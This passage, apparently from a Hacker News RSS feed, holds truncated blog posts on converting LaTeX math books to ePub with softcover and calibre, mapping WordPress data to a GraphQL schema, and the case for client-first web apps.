<p><br>The conversion process is fairly complex and depends on tools written in several programming languages. Seriously, there are like 6+ different programming languages used in this pipeline: Python 3.x, Python 2.7 (because one library needs it), Perl, Ruby, JavaScript, and Bash.&nbsp; If this were a collect-them-all contest, I’d be winning big time!&nbsp; It’s a lot of dependencies to take on at once, but it had to be done. Besides, the Rube Goldberg machine is a well-recognized software design pattern 🙂</p>
<p>I’m super proud of <a href="https://github.com/minireference/sample-book/blob/master/fabfile.py">the scripts</a> I created for automating this pipeline, but I want it to be clear the real credit for everything you’re about to read goes to the people who developed the tools that I used. I was standing on the shoulders of giants: Michael Hartl (<a href="https://github.com/softcover/softcover">softcover</a> and <a href="https://github.com/softcover/polytexnic/">polytexnic</a>), Alvin Wan (<a href="https://github.com/alvinwan/TexSoup">TexSoup</a>), and Kovid Goyal (<a href="https://github.com/kovidgoyal/calibre">calibre</a>). These are the people who made all this possible through the open source software tools they maintain. They deserve the real credit—my contribution is simply to connect these tools to build an end-to-end pipeline using some Python scripts.</p>
<h4><br>Is this blog post for me?</h4>
<p>If you only have 10 more seconds of attention left, the only thing you need to know is to go install softcover (<a href="https://manual.softcover.io/book/getting_started#sec-installing_softcover">install instructions</a>) and use it for any new projects: it’s the best way of converting math books (.tex source&nbsp; files) to .epub and .mobi. Start with the sample book produced with (<code>softcover new --latex mybook</code>) and extend the chapters while compiling regularly.&nbsp;</p>

<h4>Sujet divisé</h4>
<ul>
<li>In the first part of this blog post, we’ll start with some background on eBook file formats. Think of this as the definitions section in a philosophy paper. What is an ePub file? (spoiler: it’s a zip file with .html+metadata in it) We’ll also talk about the software tools that I highly recommend for generating these files: softcover, and Calibre.<br>
<ul>
<li>This part should be interesting for anyone in the “eBook business” since understanding the underlying formats—the files that finally gets downloaded on readers’ devices—is a big thing. Even if you’re not technical, you need to know this stuff.</li>
<li>There will be some technical details (like command line terminal or cmd.exe) but it’s not that bad. In fact the tools described can probably be used by anyone who can get over the OMG-this-is-a-command-line-thing fear. Once you go through the process a couple of times, the “What am I supposed to type here?” moments go away, and you’ll know what to type: commands. Just like point-and-click commands run programs, command-line terminal commands run programs too.</li>
</ul>
</li>
<li>The second part of the blog post will get into the nitty-gritty details of the transformations and processing steps described in Figure 1. There will be a lot of link-dropping to useful scripts, but note some of the scripts are very specific to the .tex macros used in the <strong>No Bullshit Guide</strong> textbooks, so don’t expect to reuse the same code directly. Think of it more like sample code. Or badge:proof-of-concept.
<ul>
<li>The technical details will only make sense after you have researched Softcover and Calibre, you’ve played around with them, and now you want to learn how to use them glue them together using a script. This code walkthrough is mainly written as a remember and how-it-works logbook for the Minireference Co. dev team (yours truly).</li>
<li>The technical parts will be interesting for anyone who needs to convert equation-heavy .tex books into .epub files, and <em>insists</em> on the math equations not looking horrible. Basically, if you’re a self-respecting self-publisher of math textbooks, then we’ve got some scripts for you!</li>
</ul>
</li>
</ul>

<p>Let’s begin.</p>


<h2>Nouns: eBook File formats</h2>
<p>Let’s talk a little bit about eBook formats before we get into the technical details. It’s good to know a little bit about the final products we’re trying to produce.</p>
<h3>Kindle file formats</h3>
<p>The <a href="https://en.wikipedia.org/wiki/Kindle_File_Format">Kindle file formats</a> (.awz, .awz3, .kf8, etc.) are a family of proprietary format used on Amazon Kindle devices. There is no way to generate Kindle eBooks directly, instead, the <a href="https://kdp.amazon.com/en_US/help/topic/G200634390#EPUB">recommended procedure for KDP</a> distribution is to generate an ePub file and let KDP take care of the conversion to their proprietary formats. So for distribution on Kindle devices through KDP, the key is to generate a good quality, standards-compliant ePub.</p>
<h3>Mobi format</h3>
<p>The .mobi format (short for Mobipocket) is another proprietary eBook file format that was very popular before the wide adoption of ePub. Early versions of the Amazon Kindle used mobi format internally, so the mobi format is still supported on Kindle devices.</p>
<p>It’s considered good practice for eBook publishers to offer .mobi files in addition to .epub for the benefit of readers who have a Kindle device, since Kindle devices don’t support ePub files natively. Luckily there is an excellent command-line tool for this (<a href="https://manual.calibre-ebook.com/generated/en/ebook-convert.html">ebook-convert</a>) that comes with every installation of <a href="https://calibre-ebook.com/">Calibre</a>.</p>
<p>Using ebook-convert is really simple. If you have a source file <code>book.epub</code>, and you want to convert it to .mobi format, you can run</p>
<pre>ebook-convert book.epub book.mobi --mobi-file-type both</pre>
<p>and you’ll end up with a file that is readable by all Kindle devices.</p>
<h3>ePub format</h3>
<p>This is the most widely-supported format for ebooks and the main focus of our efforts here. The ePub file format is based on web technologies like HTML and CSS, and it is codified as an <a href="https://www.w3.org/publishing/epub3/epub-overview.html">IDPF standard</a>. An .epub eBook is a self-contained container of HTML, CSS, images, and metadata that is packaged as a .zip file. If you have an ePub file you can change it’s extension from .epub to .zip and unzip it to look at the contents.&nbsp; You can also use an ePub editor like <a href="https://github.com/Sigil-Ebook/Sigil/releases/tag/1.4.0">Sigil</a> that lets you “view source” and modify ePub files directly without the need to unzip them first.</p>
<p>The use of HTML for content is—in principle—a good thing. In practice, different readers have different levels of support for markup, styling, and media playback, and very few ePub readers support the possibility of running scripts. For this reason, we take a conservative approach and target the basic ePub v3 format, without taking advantage of modern features of the web platform like SVG images, audio playback, and interactive elements. I’m looking forward to exploring these advanced features of ePub3 in the future, but for maximum compatibility, I will avoid such niceties for now and assume the “client” is a bare-bones eReader device that only supports basic HTML, CSS, and images.</p>
<p>So how do you build an ePub? Theoretically you just prepare your book using HTML markup and you’re done. Well, not quite. When I said the ePub format is based on web technologies like HTML and CSS, it’s a bit misleading, since that covers only the content pages—the chapters of the book. Additionally, a standards-compliant .epub file must also specify the book metadata (<code>content.opf</code>) and&nbsp; structure (<code>toc.ncx</code>). There are several “ebook frameworks” like <a href="https://pandoc.org/">pandoc</a>, <a href="https://www.sphinx-doc.org/">Sphinx</a>, <a href="https://www.gitbook.com/">gitbook</a>, etc. that can be used to produce ePubs. If your book doesn’t contain math equations,&nbsp; I would recommend one of these well-established frameworks to “outsource” the complexity of generating the ePub. See this <a href="https://puppet.com/blog/how-we-automated-our-ebook-builds-pandoc-and-kindlegen/">blog post</a> for example.</p>
<p>However, in the case of the No Bullshit Guide textbooks, we’re starting with 1000+ pages of LaTeX source files containing A LOT of equations.</p>
<p><strong>Statement of the problem</strong>: Generate a good-looking ePub file from LaTeX source files that include equations, figures, tables, and custom macros for exercises and problems.</p>
<p>The occurrence of the word “custom” should give you a hint that things will get interesting soon…</p>

<h2>Verbs: Software Tools</h2>
<p>Let’s now talk about the software tools that perform the specific transformation from .tex source to .epub file. In order of importance these tools are <a href="https://github.com/softcover/softcover">softcover</a>, <a href="https://github.com/kovidgoyal/calibre">calibre</a>,&nbsp; <a href="https://github.com/alvinwan/TexSoup">TexSoup</a>, and <a href="https://ploxiln.github.io/fab-classic/tutorial.html">fab-classic</a>. We start with the most important parts first: the tools that are broadly reusable in any context; we defer the technical details about the specific transformations we perform until the second half …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://minireference.com/blog/generating-epub-from-latex/">https://minireference.com/blog/generating-epub-from-latex/</a></em></p>]]>
            </description>
            <link>https://minireference.com/blog/generating-epub-from-latex/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356903</guid>
            <pubDate>Fri, 05 Mar 2021 13:59:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rejuvenating WordPress Through GraphQL]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 4 (<a href="https://news.ycombinator.com/item?id=26356546">thread link</a>) | @jun-e
<br/>
March 5, 2021 | https://graphql-api.com/blog/rejuvenating-wordpress-through-graphql/ | <a href="https://web.archive.org/web/*/https://graphql-api.com/blog/rejuvenating-wordpress-through-graphql/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>WordPress is a legacy CMS: having been invented over 17 years ago, it's filled with PHP code that, given a new chance, it would be coded in a different way.</p><p>GraphQL is a modern interface to access data. Please notice the word "interface": it doesn't care how the underlying data system is implemented, but only how to expose the data.</p><p>What happens when we put these two together? How should we design the GraphQL interface to access data from WordPress?</p><p>There are a couple of obvious strategies that we can put in place:</p><ol><li><p>Respect tradition, and provide a mapping that keeps the WordPress data model as is, including the technical debt it accumulated during the years</p></li><li><p>Fix the technical debt, providing an interface exposing data in an abstract, not-necessarily-fixed-to-WordPress way</p></li></ol><p>Both approaches have benefits and drawbacks, and there is no right or wrong. It's just opinionatedness, prioritizing some behavior over another.</p><p>For plugin <a href="https://graphql-api.com/">GraphQL API for WordPress</a> I have chosen the latter approach, attempting to create a GraphQL schema that, even though it is based on WordPress and works for WordPress, it is not tied to WordPress (for instance, by removing inconsistent names and relationships).</p><p>The result is that GraphQL rejuvenates WordPress: while we still have WordPress as our underlying CMS, with its legacy PHP code, its data layer can be created anew, based on common sense, not tradition. The data layer goes back from being an adolescent, to become a toddler again.</p><p><img src="https://graphql-api.com/images/own-good-together-best.jpg" alt="GraphQL + WordPress rock" loading="lazy" width="577" height="433"></p><p>The result is <a href="https://newapi.getpop.org/graphql-interactive/">this GraphQL schema, representing the WordPress data model</a>, and also <a href="https://newapi.getpop.org/graphql-interactive/?mutation_scheme=nested">supporting nested mutations</a>.</p><p>Let's check out it was carried out.</p><h2 id="heading-the-wordpress-data-model">The WordPress data model<a href="#heading-the-wordpress-data-model"><span> permalink</span></a></h2><p>WordPress has the following entities:</p><ul><li>posts</li><li>pages</li><li>custom posts</li><li>media elements</li><li>users</li><li>user roles</li><li>tags</li><li>categories</li><li>comments</li><li>blocks</li><li>meta properties</li><li>others (options, plugins, themes, etc)</li></ul><p>These entities can have a hierarchy. For instance, post, page and media elements are both custom post types, and tags and categories are both taxonomies.</p><p>This is the WordPress database diagram, showing how data for all entities is stored:</p><figure><a href="https://graphql-api.com/assets/guides/query/wp-data-model.png" target="_blank"><img src="https://graphql-api.com/assets/guides/query/wp-data-model.png" alt="The WordPress database diagram" loading="lazy" width="793" height="1118"></a><figcaption>The WordPress database diagram</figcaption></figure><h2 id="heading-is-the-mapping-an-exact-replica-of-the-db-diagram">Is the mapping an exact replica of the DB diagram?<a href="#heading-is-the-mapping-an-exact-replica-of-the-db-diagram"><span> permalink</span></a></h2><p>When mapping the WordPress database into a GraphQL schema, is the same diagrame above respected 1 to 1?</p><p>No, it is not. While the database diagram is an actual implementation, GraphQL is an interface to access the data from the client. These two are related, but they can be different. GraphQL doesn't care about the database: it doesn't think in SQL commands, or know there are database tables called <code>wp_posts</code> and <code>wp_users</code>.</p><p>So we don't need to worry too much about the database diagram when creating the GraphQL schema for WordPress. That means that we can produce a GraphQL schema that fixes some of the technical debt from the WordPress data model.</p><h2 id="heading-mapping-the-wordpress-data-model-as-a-graphql-schema">Mapping the WordPress data model as a GraphQL schema<a href="#heading-mapping-the-wordpress-data-model-as-a-graphql-schema"><span> permalink</span></a></h2><p>Let's do the mapping. First, we map the original entities as types, as much as possible. From the list of entities in the WordPress data model, we produce the following types for the GraphQL schema:</p><ul><li><code>Post</code></li><li><code>Page</code></li><li><code>Media</code></li><li><code>User</code></li><li><code>UserRole</code></li><li><code>PostTag</code></li><li><code>PostCategory</code></li><li><code>Comment</code></li></ul><p>Then, we add all the expected fields to every type. To represent the schema, we can use the SDL, or Schema Definition Language. (This is used for documentation purposes only; the plugin itself does not use SDL to codify the schema: it's all PHP code).</p><p>These are the fields (among many others) for a <code>Post</code>:</p><pre><code><span><span>type</span> <span>Post</span> <span>{</span></span><br><span>  <span>id</span><span>:</span> ID<span>!</span></span><br><span>  <span>title</span><span>:</span> String</span><br><span>  <span>content</span><span>:</span> String</span><br><span>  <span>excerpt</span><span>:</span> String</span><br><span>  <span>date</span><span>:</span> Date<span>!</span></span><br><span><span>}</span></span></code></pre><p>These are the fields (among many others) for a <code>User</code>:</p><pre><code><span><span>type</span> <span>User</span> <span>{</span></span><br><span>  <span>id</span><span>:</span> ID<span>!</span></span><br><span>  <span>name</span><span>:</span> String</span><br><span>  <span>email</span><span>:</span> String<span>!</span></span><br><span><span>}</span></span></code></pre><p>We also create the corresponding connections, which are fields that return another entity (instead of a scalar, such as a number or a string). For instance, we represent a post having an author, and a user owning posts:</p><pre><code><span><span>type</span> <span>Post</span> <span>{</span></span><br><span>  <span>author</span><span>:</span> User<span>!</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>User</span> <span>{</span></span><br><span>  <span>posts</span><span>:</span> <span>[</span>Post<span>]</span></span><br><span><span>}</span></span></code></pre><p>Fields and connections can also accept arguments. For instance, we enable <code>Post.date</code> to be formatted, and <code>User.posts</code> to search entries and limit their number:</p><pre><code><span><span>type</span> <span>Post</span> <span>{</span></span><br><span>  <span>date</span><span>(</span><span>format</span><span>:</span> String<span>)</span><span>:</span> Date<span>!</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>User</span> <span>{</span></span><br><span>  <span>posts</span><span>(</span><span>limit</span><span>:</span> Int<span>,</span> <span>search</span><span>:</span> String<span>)</span><span>:</span> <span>[</span>Post<span>]</span></span><br><span><span>}</span></span></code></pre><p>We keep doing this for all entities in the WordPress data model. Once we are done, we'll arrive at the GraphQL schema for WordPress, as visible using the Voyager client (available as "Interactive Schema" on the plugin's menu):</p><figure><a href="https://graphql-api.com/assets/guides/interactive-schema.png" target="_blank"><img src="https://graphql-api.com/assets/guides/interactive-schema.png" alt="The GraphQL schema for WordPress" loading="lazy" width="1680" height="976"></a><figcaption>The GraphQL schema for WordPress</figcaption></figure><p>This schema has similarities to the WordPress database diagram, but also many differences. Let's analyse them.</p><h3 id="heading-operations-without-entity-are-mapped-as-root-fields">Operations without entity are mapped as Root fields<a href="#heading-operations-without-entity-are-mapped-as-root-fields"><span> permalink</span></a></h3><p>In the WordPress database diagram represents how data is stored, so there is no "beginning". GraphQL, though, is an interface to retrieve data, hence there must be an initial stage from which to execute the query.</p><p>This initial stage is the <code>Root</code> type, or, to be more precise, the <code>QueryRoot</code> and <code>MutationRoot</code> types (to deal with queries and mutations, respectively).</p><p>In these two types, we map all operations that do not depend on an entity, such as when executing <code>get_posts()</code>, <code>get_users()</code> or <code>wp_signon()</code>:</p><pre><code><span><span>type</span> <span>QueryRoot</span> <span>{</span></span><br><span>  <span>posts</span><span>:</span> <span>[</span>Post<span>]</span><span>!</span></span><br><span>  <span>users</span><span>:</span> <span>[</span>User<span>]</span><span>!</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>MutationRoot</span> <span>{</span></span><br><span>  <span>logUserIn</span><span>(</span><span>username</span><span>:</span> String<span>,</span> <span>password</span><span>:</span> String<span>)</span><span>:</span> User</span><br><span><span>}</span></span></code></pre><p>The fields do not need to have the same name or signature as the operation they represent. For instance, calling field <code>logUserIn</code> can be considered more suitable than <code>signOn</code>.</p><h3 id="heading-all-mutations-go-under-mutationroot">All mutations go under MutationRoot<a href="#heading-all-mutations-go-under-mutationroot"><span> permalink</span></a></h3><p>There are operations which do depend on an entity, such as <code>wp_update_post()</code>, which is applied on some post. The corresponding mutation on the GraphQL schema must be added to the <code>MutationRoot</code> type, because that's how GraphQL works.</p><p>Then, this operation is mapped like this:</p><pre><code><span><span>type</span> <span>MutationRoot</span> <span>{</span></span><br><span>  <span>updatePost</span><span>(</span><span>postID</span><span>:</span> ID<span>!</span><span>,</span> <span>newTitle</span><span>:</span> String<span>,</span> <span>newContent</span><span>:</span> String<span>)</span><span>:</span> Post</span><br><span><span>}</span></span></code></pre><p>This plugin also supports nested mutations, which are offered as an opt-in feature (because this is not standad GraphQL behavior). Then, mutations can also be added under any type, not just <code>MutationRoot</code>. In this case, we obtain:</p><pre><code><span><span>type</span> <span>Post</span> <span>{</span></span><br><span>  <span>update</span><span>(</span><span>newTitle</span><span>:</span> String<span>,</span> <span>newContent</span><span>:</span> String<span>)</span><span>:</span> Post<span>!</span></span><br><span><span>}</span></span></code></pre><h3 id="heading-dealing-with-custom-posts">Dealing with custom posts<a href="#heading-dealing-with-custom-posts"><span> permalink</span></a></h3><p>There is no type inheritance in GraphQL. Hence, we can't have a type <code>CustomPost</code>, and declare that <code>Post</code> and <code>Page</code> extend it.</p><p>GraphQL offers two resources to compensate for this lack: interfaces and union types.</p><p>For the first one, we create an interface <code>IsCustomPost</code> for the schema, declaring all the fields expected from a custom post, and we define types <code>Post</code> and <code>Page</code> to implement the interface:</p><pre><code><span><span>interface</span> <span>IsCustomPost</span> <span>{</span></span><br><span>  <span>title</span><span>:</span> String</span><br><span>  <span>content</span><span>:</span> String</span><br><span>  <span>excerpt</span><span>:</span> String</span><br><span>  <span>date</span><span>(</span><span>format</span><span>:</span> String<span>)</span><span>:</span> Date<span>!</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>Post</span> <span>implements</span> <span>IsCustomPost</span> <span>{</span></span><br><span>  <span>title</span><span>:</span> String</span><br><span>  <span>content</span><span>:</span> String</span><br><span>  <span>excerpt</span><span>:</span> String</span><br><span>  <span>date</span><span>(</span><span>format</span><span>:</span> String<span>)</span><span>:</span> Date<span>!</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>Page</span> <span>implements</span> <span>IsCustomPost</span> <span>{</span></span><br><span>  <span>title</span><span>:</span> String</span><br><span>  <span>content</span><span>:</span> String</span><br><span>  <span>excerpt</span><span>:</span> String</span><br><span>  <span>date</span><span>(</span><span>format</span><span>:</span> String<span>)</span><span>:</span> Date<span>!</span></span><br><span><span>}</span></span></code></pre><p>For the second one, we create a <code>CustomPostUnion</code> type for the schema returning all the custom post types:</p><pre><code><span><span>union</span> <span>CustomPostUnion</span> <span>=</span> Post <span>|</span> Page</span></code></pre><p>And have fields return this type whenever appropriate:</p><pre><code><span><span>type</span> <span>QueryRoot</span> <span>{</span></span><br><span>  <span>customPost</span><span>(</span><span>id</span><span>:</span> ID<span>)</span><span>:</span> CustomPostUnion</span><br><span>  <span>customPosts</span><span>:</span> <span>[</span>CustomPostUnion<span>]</span><span>!</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>User</span> <span>{</span></span><br><span>  <span>customPosts</span><span>:</span> <span>[</span>CustomPostUnion<span>]</span></span><br><span><span>}</span></span><br><span></span><br><span><span>type</span> <span>Comment</span> <span>{</span></span><br><span>  <span>customPost</span><span>:</span> CustomPostUnion<span>!</span></span><br><span><span>}</span></span></code></pre><p>As it can be observed, in the GraphQL schema we need to explicitly assert when we are dealing with posts, and when with custom posts, since they are not the same! Calling these two interchangeably is technical debt from WordPress, which we can fix.</p><p>For this reason, a custom post is always called <code>CustomPost</code> and not <code>Post</code>, a field dealing with custom posts is always called <code>customPosts</code> and not <code>posts</code>, and a field argument receiving the ID for a custom post is called <code>customPostID</code> and not <code>postID</code> (even though that's how it's called in the mapped WordPress function).</p><p>Then, the expectation is always clear:</p><ul><li>field <code>User.customPosts</code> can return a list of any custom post, including posts and pages, and <code>User.posts</code> only returns posts</li><li>field <code>Root.setFeaturedImageOnCustomPost</code> can add a featured image to any custom post, that's why it's not called <code>setFeaturedImageOnPost</code></li></ul><h3 id="heading-not-grouping-tags-(and-categories)-under-a-single-type">Not grouping tags (and categories) under a single type<a href="#heading-not-grouping-tags-(and-categories)-under-a-single-type"><span> permalink</span></a></h3><p>Why is type <code>PostTag</code> (and same for <code>PostCategory</code>) called like that, instead of just <code>Tag</code>?</p><p>Because, when executing this query (where a product is a CPT), the results from field <code>tags</code> for posts and products will always be different, non-overlapping:</p><pre><code><span><span>query</span> <span>{</span></span><br><span>  posts <span>{</span></span><br><span>    tags <span>{</span></span><br><span>      id</span><br><span>      name</span><br><span>    <span>}</span></span><br><span>  <span>}</span></span><br><span>  products <span>{</span></span><br><span>    tags <span>{</span></span><br><span>      id</span><br><span>      name</span><br><span>    <span>}</span></span><br><span>  <span>}</span></span><br><span><span>}</span></span></code></pre><p>Tags added to posts will not show up when retrieving tags for products, and the other way around (unless a product also uses the <code>post_tag</code> taxonomy, but then it can also be represented with the <code>PostTag</code> type). This does not represent a big deal in WordPress, since these items can be considered different rows from the same database table. But it does matter for GraphQL, which is strongly typed.</p><p>Then, it's a good design decision to keep these entities separate, under their own types, and have tags for posts returned under the <code>PostTag</code> type and, if a custom plugin implements its own product CPT, it must use the <code>ProductTag</code> type for its tags.</p><h3 id="heading-giving-media-items-their-own-identity">Giving media items their own identity<a href="#heading-giving-media-items-their-own-identity"><span> permalink</span></a></h3><p>Media entities in WordPress are custom post types, only because it was convenient from an implementation point of view. However, the GraphQL schema can avoid this technical debt, and model media elements as a distinct entity, not as custom posts.</p><p>This implies the following decisions for the GraphQL schema:</p><ul><li>When querying field <code>customPosts</code>, it will not fetch media elements</li><li>The <code>Media</code> type does not implement the <code>IsCustomPost</code> interface, and won't be part of the <code>CustomPostUnion</code> type</li><li>The <code>Media</code> type doesn't have many fields expected from a custom post type, such as <code>excerpt</code>, <code>date</code> and <code>status</code>. Instead, it only has those fields expected from a media element:</li></ul><pre><code><span><span>type</span> <span>Media</span> <span>{</span></span><br><span>  <span>id</span><span>:</span> ID<span>!</span></span><br><span>  <span>src</span><span>:</span> String<span>!</span></span><br><span>  <span>width</span><span>:</span> Int</span><br><span>  <span>height</span><span>:</span> Int</span><br><span><span>}</span></span></code></pre><h3 id="heading-identifying-and-mapping-enums">Identifying and mapping enums<a href="#heading-identifying-and-mapping-enums"><span> permalink</span></a></h3><p>In some situations, WordPress uses fixed values from a given set. For instance, the status of a post can only be <code>"publish…</code></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://graphql-api.com/blog/rejuvenating-wordpress-through-graphql/">https://graphql-api.com/blog/rejuvenating-wordpress-through-graphql/</a></em></p>]]>
            </description>
            <link>https://graphql-api.com/blog/rejuvenating-wordpress-through-graphql/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356546</guid>
            <pubDate>Fri, 05 Mar 2021 13:22:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Case for building Client-First web apps  (2020)]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26356391">thread link</a>) | @EGreg
<br/>
March 5, 2021 | https://qbix.com/blog/2020/01/02/the-case-for-building-client-first-web-apps/ | <a href="https://web.archive.org/web/*/https://qbix.com/blog/2020/01/02/the-case-for-building-client-first-web-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<p>Now that 2020 is here, let’s look at what we can expect from the next decade in software. As Web developers, our solutions can help shape the organizations we work for. The tools we build and the architectural decisions we make have a compounding effect on society at large. What are the new trends, and will they help empower or enslave people?</p>
<h2>The Old Trends</h2>
<p>The trends in the last 10-20 years have led to more and more&nbsp;<a href="https://qbix.com/blog/2017/08/20/centralization-and-open-source/">centralization of the Web</a>, consolidation of power in the hands of the largest services (Facebook, Google, Amazon, Reddit) and their extended ecosystems. Between these and the large publications, the “independent Web” has suffered a tremendous setback. Most people and organizations trust large corporations with proprietary algorithms to manage their data, identity and brand. This has led to&nbsp;<a href="https://qbix.com/blog/2019/03/08/how-qbix-platform-can-change-the-world/">massive new issues for individuals and society</a>, involving governments and corporations, and how we all relate to one another. Attempts to resolve these issues have spawned some projects to&nbsp;<a href="https://qbix.com/blog/2017/08/30/the-future-of-decentralization/">decentralize the Web</a>.</p>
<p>When the Web was born, browsers rendered HTML documents, and there was very little support for client-side programming. Whatever Javascript support was introduced over the next decade was inconsistent because of the&nbsp;<a href="https://en.wikipedia.org/wiki/Browser_wars">browser wars</a>, and led to&nbsp;<a href="http://www.jqueryvsmootools.com/">Javascript libraries</a> to bridge the gap, of which jQuery emerged as the winner. The last 10 years saw the rise of&nbsp;<a href="https://angular.io/">Angular</a> and&nbsp;<a href="https://reactjs.org/">React</a>, new versions of&nbsp;<a href="https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/HTML5">Javascript</a> and&nbsp;<a href="https://developer.mozilla.org/en-US/docs/Web/API">HTML5 Web APIs</a>, which finally made front-end Web programming a powerful proposition on the most widely deployed platform in the world.</p>
<h2>Client-First Web Apps</h2>
<p>As Javascript was maturing, a conventional wisdom has developed among most Web developers, that you should render the HTML on the client side, and then progressively enhance it with Javascript. This was considered best practice and recommended by pretty much every authority from&nbsp;<a href="https://www.freecodecamp.org/news/what-is-progressive-enhancement-and-why-it-matters-e80c7aaf834a/">2009</a> to&nbsp;<a href="https://www.freecodecamp.org/news/what-is-progressive-enhancement-and-why-it-matters-e80c7aaf834a/">2018</a>.</p>
<p>In this decade, Web developers will turn this conventional wisdom on its head, and start to consider progressive enhancement to go the other way:</p>
<ol>
<li>First, develop static HTML, CSS and Javascript</li>
<li>Make Javascript fetch data from servers, render it on the client</li>
<li>Progressively enhance the site for older environments (Server-rendered HTML)</li>
</ol>
<p>What follows are multiple reasons for why this is the better approach going forward.&nbsp;This one shift in how we approach Web development will have profound technological and societal implications.</p>
<h2 id="distributing-software">Distributing Software</h2>
<p><strong>1. Separation of concerns.</strong> It pays to decouple the rendering of an interface from the delivery of code / markup. That way we are not tied to one type of app delivery — that of a server on the web sending our executable code. We are able to&nbsp;<a href="https://en.wikipedia.org/wiki/Sideloading">sideload apps</a>, download them from&nbsp;<a href="https://developer.apple.com/documentation/bundleresources">app stores</a>, and update specific files when they have changed. And we use one language for each task, too: JS is the code. HTML / Handlebars / etc. can be used for templates / markup. CSS is used for presentation. JSON or XML is used for data. After you have done this, if you want to pre-render HTML on a server for AJAX, you can, but will start to feel “dirty” as you’ll be coupling things unnecessarily again. Things are going this way as&nbsp;<a href="https://www.gatsbyjs.org/blog/2019-10-15-free-headless-cms/">headless CMSes</a> are making an appearance, while&nbsp;<a href="https://cordova.apache.org/">Cordova</a>,&nbsp;<a href="https://ionicframework.com/">Ionic</a> and&nbsp;<a href="https://facebook.github.io/react-native/">React Native</a> represent other ways of delivering code through app stores.</p>
<p><strong>2. Trust. </strong>You can’t trust what code is running remotely (although Signal&nbsp;<a href="https://signal.org/blog/private-contact-discovery/">has been experimenting</a> with using&nbsp;<a href="https://software.intel.com/en-us/articles/innovative-technology-for-cpu-based-attestation-and-sealing">Software Guard Extensions</a> by CPU makers, originally designed for DRM, to go the other way and ensure what code runs on a server). But even if you can, you have no guarantee some other process won’t steal or corrupt your data. The&nbsp;<a href="https://en.wikipedia.org/wiki/Trusted_computing_base">Trusted Computing Base</a> should not include arbitrary amounts of remote sites shipping code at any time. Decoupling how the code is loaded (see point #1) onto your client allows you or your user agent to verify checksums and certify that it is indeed the code you think it is. And it is that code that should be managing your data and using the personal keys on your device. Package managers and app stores will be able to distribute code that has been audited by third-party security firms, and people will be able to trust them.</p>
<p><strong>3. Decentralization of Code.</strong> As the next decade unfolds, we will find that&nbsp;code bases don’t necessarily have to live shrink-wrapped on a specific server. Rather, clients can use multiple interoperable software modules and versions and can have multiple app stores and distributors in the future helping maintain repos and package managers for end-users and organizations. We will probably see automated package management become more user friendly in the 2020s, as we already have a docker container culture, we have browser based package managers etc.</p>
<h2 id="data-ownership">Data Ownership</h2>
<p><strong>4. Decentralization of Data.</strong> This is the big one in terms of effect on society. By having web servers render your webpage, you are implicitly locking yourself and your organization into the type of model where the servers store and access the data in a private database. They have enough data to render everything, apply access control rules to manage what you can read and write, and so on. Instead, we as a society need to empower people and their client side apps, and push the logic of fetching data, caching it and assembling it to the&nbsp;<a href="https://continuations.com/post/108271329110/tedxnewyork-big-and-bot-policy-proposals">user agents</a>. We can use&nbsp;<a href="https://en.wikipedia.org/wiki/Capability-based_security">capabilities</a> /&nbsp;<a href="https://www.oauth.com/oauth2-servers/access-tokens/">access tokens</a> for data instead of a centralized site rendering HTML.&nbsp;In this way, always inverting the progressive enhancement is an&nbsp;<em>activist</em> position to change society against the abuses of power&nbsp;<a href="https://qbix.com/blog/2019/03/08/how-qbix-platform-can-change-the-world/">like the ones listed here</a>.</p>
<p><strong>5. Reliability</strong> After the 2015 ISIS attacks in Paris, countries around the world expressed solidarity with the French people. French colors were flown, but similar-sized attacks at the same time by ISIS in&nbsp;<a href="https://www.nytimes.com/2015/11/16/world/middleeast/beirut-lebanon-attacks-paris.html?smid=tw-nytimesworld&amp;smtyp=cur&amp;_r=0">Beirut</a> were totally forgotten. Facebook rolled out a feature to customize one’s profile with the French flag superimposed, but only the French flag. So we used the Qbix Platform to quickly build a small app called&nbsp;<a href="https://customizemypic.com/">customizemypic.com</a> to allow anyone to change their profile picture to a flag of their choice. The goal was to make a statement and express solidarity with people in Beirut, Baghdad and other areas hard hit by terrorism. Today, that same app is no longer able to do its core function because Facebook&nbsp;<a href="https://developers.facebook.com/blog/post/2018/04/24/new-facebook-platform-product-changes-policy-updates/">removed any way for users to give permissions to apps</a> to upload a photo on their behalf. This is what happens when you rely on third parties to announce what you can and cannot do with your own profile picture. The most extreme reliability is achieved by an&nbsp;<a href="http://offlinefirst.org/">offline-first</a> approach, which is a close cousin of the client-first trend that will grow in the 2020s.</p>
<p><strong>6. End to End Encryption.</strong> Server-side rendering perpetuates a culture where the server has all the data unencrypted. Even if the data is encrypted at rest, the served holds all the decryption keys and is one central target for hackers, government agencies, and advertisers. Rendering things client-side goes hand-in-hand with a culture of people storing their own keys on devices of their choice, and letting key management and password management be the domain of operating systems and trusted computing bases, not random websites.</p>
<h2 id="Data Delivery">Data Delivery</h2>
<p><strong>7. Bandwidth.</strong> Ever since&nbsp;<a href="https://www.youtube.com/watch?v=rm8FAHGJB3M">Steve Jobs presented WebObjects</a>, we have wanted sites to render dynamically. Well, that often involves looping through various items and rendering each one. It is extremely wasteful to send the HTML results of rendering hundreds of items to a client, when you could have just sent the data, which would then be “hydrated” into 5. templates by the client. However, I can understand pre-rendering just the items above the fold (if one could estimate this number, not knowing the size of the window on the first request).</p>
